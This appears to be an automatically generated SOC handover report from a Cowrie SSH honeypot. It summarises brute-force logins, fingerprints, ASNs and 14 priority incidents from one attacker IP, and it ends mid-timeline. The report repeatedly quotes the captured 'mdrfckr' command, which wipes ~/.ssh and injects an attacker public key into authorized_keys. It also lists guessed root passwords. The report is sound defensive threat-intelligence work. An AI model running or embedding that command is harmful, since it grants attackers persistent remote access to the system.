# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T22:36:43Z |
| **Shift Time** | 22:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **37** |
| Confirmed Threats | **32** |
| False Positives Filtered | **5** (13.5%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **8** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **23** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **26** |
| Unique Credential Pairs | **14** |
| Unique Usernames | **7** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `steam` | 1 |
| `test` | 1 |
| `kiosk` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `12345678Aa` | 1 |
| `Qazwsx1$` | 1 |
| `147258` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `12345678Aa` | 1 |
| `root` | `Qazwsx1$` | 1 |
| `root` | `147258` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345678Aa` | `202.165.29.174` | 2026-04-07T20:43:42 |
| `root` | `3245gs5662d34` | `202.165.29.174` | 2026-04-07T20:43:45 |
| `root` | `Qazwsx1$` | `202.165.29.174` | 2026-04-07T20:45:28 |
| `root` | `147258` | `202.165.29.174` | 2026-04-07T20:47:13 |
| `root` | `Root2026@@` | `202.165.29.174` | 2026-04-07T20:52:29 |
| `root` | `AAAAAA` | `202.165.29.174` | 2026-04-07T20:54:07 |
| `root` | `1234root` | `202.165.29.174` | 2026-04-07T20:59:15 |
| `root` | `huawei@2025` | `202.165.29.174` | 2026-04-07T21:02:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **37** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 26 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 26 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 26 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `202.165.29.174`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **8** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS202425` | IP Volume inc | 1 | HIGH |
| `AS16135` | Turkcell A.S. | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | LOW |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS18206` | TM TECHNOLOGY SERVICES SDN. BHD. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a89846be2af

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:43 |
| **Last Seen** | 2026-04-07 20:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:43:42` | `cowrie.session.connect` |
| `2026-04-07 20:43:42` | `cowrie.client.version` |
| `2026-04-07 20:43:42` | `cowrie.client.kex` |
| `2026-04-07 20:43:42` | `cowrie.login.success` |
| `2026-04-07 20:43:42` | `cowrie.session.params` |
| `2026-04-07 20:43:42` | `cowrie.command.input` |
| `2026-04-07 20:43:42` | `cowrie.command.failed` |
| `2026-04-07 20:43:42` | `cowrie.log.closed` |
| `2026-04-07 20:43:43` | `cowrie.session.params` |
| `2026-04-07 20:43:43` | `cowrie.command.input` |
| `2026-04-07 20:43:43` | `cowrie.session.file_download` |
| `2026-04-07 20:43:43` | `cowrie.log.closed` |
| `2026-04-07 20:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9378ba92b773

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:43 |
| **Last Seen** | 2026-04-07 20:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:43:44` | `cowrie.session.connect` |
| `2026-04-07 20:43:44` | `cowrie.client.version` |
| `2026-04-07 20:43:44` | `cowrie.client.kex` |
| `2026-04-07 20:43:45` | `cowrie.login.success` |
| `2026-04-07 20:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b7eb1a41be

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:45 |
| **Last Seen** | 2026-04-07 20:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:45:27` | `cowrie.session.connect` |
| `2026-04-07 20:45:27` | `cowrie.client.version` |
| `2026-04-07 20:45:27` | `cowrie.client.kex` |
| `2026-04-07 20:45:28` | `cowrie.login.success` |
| `2026-04-07 20:45:28` | `cowrie.session.params` |
| `2026-04-07 20:45:28` | `cowrie.command.input` |
| `2026-04-07 20:45:28` | `cowrie.command.failed` |
| `2026-04-07 20:45:28` | `cowrie.log.closed` |
| `2026-04-07 20:45:28` | `cowrie.session.params` |
| `2026-04-07 20:45:28` | `cowrie.command.input` |
| `2026-04-07 20:45:28` | `cowrie.session.file_download` |
| `2026-04-07 20:45:28` | `cowrie.log.closed` |
| `2026-04-07 20:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932b4298fe55

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:45 |
| **Last Seen** | 2026-04-07 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:45:30` | `cowrie.session.connect` |
| `2026-04-07 20:45:30` | `cowrie.client.version` |
| `2026-04-07 20:45:30` | `cowrie.client.kex` |
| `2026-04-07 20:45:30` | `cowrie.login.success` |
| `2026-04-07 20:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5729b8f3af2d

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:47 |
| **Last Seen** | 2026-04-07 20:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:47:12` | `cowrie.session.connect` |
| `2026-04-07 20:47:12` | `cowrie.client.version` |
| `2026-04-07 20:47:12` | `cowrie.client.kex` |
| `2026-04-07 20:47:13` | `cowrie.login.success` |
| `2026-04-07 20:47:13` | `cowrie.session.params` |
| `2026-04-07 20:47:13` | `cowrie.command.input` |
| `2026-04-07 20:47:13` | `cowrie.command.failed` |
| `2026-04-07 20:47:13` | `cowrie.log.closed` |
| `2026-04-07 20:47:13` | `cowrie.session.params` |
| `2026-04-07 20:47:13` | `cowrie.command.input` |
| `2026-04-07 20:47:13` | `cowrie.session.file_download` |
| `2026-04-07 20:47:13` | `cowrie.log.closed` |
| `2026-04-07 20:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68bb76355f16

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:47 |
| **Last Seen** | 2026-04-07 20:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:47:15` | `cowrie.session.connect` |
| `2026-04-07 20:47:15` | `cowrie.client.version` |
| `2026-04-07 20:47:15` | `cowrie.client.kex` |
| `2026-04-07 20:47:15` | `cowrie.login.success` |
| `2026-04-07 20:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e38a213155

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:52 |
| **Last Seen** | 2026-04-07 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:52:29` | `cowrie.session.connect` |
| `2026-04-07 20:52:29` | `cowrie.client.version` |
| `2026-04-07 20:52:29` | `cowrie.client.kex` |
| `2026-04-07 20:52:29` | `cowrie.login.success` |
| `2026-04-07 20:52:29` | `cowrie.session.params` |
| `2026-04-07 20:52:29` | `cowrie.command.input` |
| `2026-04-07 20:52:29` | `cowrie.command.failed` |
| `2026-04-07 20:52:29` | `cowrie.log.closed` |
| `2026-04-07 20:52:30` | `cowrie.session.params` |
| `2026-04-07 20:52:30` | `cowrie.command.input` |
| `2026-04-07 20:52:30` | `cowrie.session.file_download` |
| `2026-04-07 20:52:30` | `cowrie.log.closed` |
| `2026-04-07 20:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e4ea9c37b9

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:52 |
| **Last Seen** | 2026-04-07 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:52:31` | `cowrie.session.connect` |
| `2026-04-07 20:52:31` | `cowrie.client.version` |
| `2026-04-07 20:52:31` | `cowrie.client.kex` |
| `2026-04-07 20:52:32` | `cowrie.login.success` |
| `2026-04-07 20:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b06f76acc5

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:54 |
| **Last Seen** | 2026-04-07 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:54:07` | `cowrie.session.connect` |
| `2026-04-07 20:54:07` | `cowrie.client.version` |
| `2026-04-07 20:54:07` | `cowrie.client.kex` |
| `2026-04-07 20:54:07` | `cowrie.login.success` |
| `2026-04-07 20:54:08` | `cowrie.session.params` |
| `2026-04-07 20:54:08` | `cowrie.command.input` |
| `2026-04-07 20:54:08` | `cowrie.command.failed` |
| `2026-04-07 20:54:08` | `cowrie.log.closed` |
| `2026-04-07 20:54:08` | `cowrie.session.params` |
| `2026-04-07 20:54:08` | `cowrie.command.input` |
| `2026-04-07 20:54:08` | `cowrie.session.file_download` |
| `2026-04-07 20:54:08` | `cowrie.log.closed` |
| `2026-04-07 20:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd42d736e370

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:54 |
| **Last Seen** | 2026-04-07 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:54:10` | `cowrie.session.connect` |
| `2026-04-07 20:54:10` | `cowrie.client.version` |
| `2026-04-07 20:54:10` | `cowrie.client.kex` |
| `2026-04-07 20:54:10` | `cowrie.login.success` |
| `2026-04-07 20:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3f436ac9e99

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:59 |
| **Last Seen** | 2026-04-07 20:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:59:14` | `cowrie.session.connect` |
| `2026-04-07 20:59:14` | `cowrie.client.version` |
| `2026-04-07 20:59:14` | `cowrie.client.kex` |
| `2026-04-07 20:59:15` | `cowrie.login.success` |
| `2026-04-07 20:59:15` | `cowrie.session.params` |
| `2026-04-07 20:59:15` | `cowrie.command.input` |
| `2026-04-07 20:59:15` | `cowrie.command.failed` |
| `2026-04-07 20:59:15` | `cowrie.log.closed` |
| `2026-04-07 20:59:15` | `cowrie.session.params` |
| `2026-04-07 20:59:15` | `cowrie.command.input` |
| `2026-04-07 20:59:15` | `cowrie.session.file_download` |
| `2026-04-07 20:59:15` | `cowrie.log.closed` |
| `2026-04-07 20:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dab89a556d0

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 20:59 |
| **Last Seen** | 2026-04-07 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:59:17` | `cowrie.session.connect` |
| `2026-04-07 20:59:17` | `cowrie.client.version` |
| `2026-04-07 20:59:17` | `cowrie.client.kex` |
| `2026-04-07 20:59:17` | `cowrie.login.success` |
| `2026-04-07 20:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325bdd62126c

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 21:02 |
| **Last Seen** | 2026-04-07 21:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 21:02:42` | `cowrie.session.connect` |
| `2026-04-07 21:02:42` | `cowrie.client.version` |
| `2026-04-07 21:02:42` | `cowrie.client.kex` |
| `2026-04-07 21:02:43` | `cowrie.login.success` |
| `2026-04-07 21:02:43` | `cowrie.session.params` |
| `2026-04-07 21:02:43` | `cowrie.command.input` |
| `2026-04-07 21:02:43` | `cowrie.command.failed` |
| `2026-04-07 21:02:43` | `cowrie.log.closed` |
| `2026-04-07 21:02:43` | `cowrie.session.params` |
| `2026-04-07 21:02:43` | `cowrie.command.input` |
| `2026-04-07 21:02:43` | `cowrie.session.file_download` |
| `2026-04-07 21:02:43` | `cowrie.log.closed` |
| `2026-04-07 21:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d8a328abdd

| Field | Detail |
|---|---|
| **Source IP** | `202.165.29[.]174` |
| **First Seen** | 2026-04-07 21:02 |
| **Last Seen** | 2026-04-07 21:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 21:02:45` | `cowrie.session.connect` |
| `2026-04-07 21:02:45` | `cowrie.client.version` |
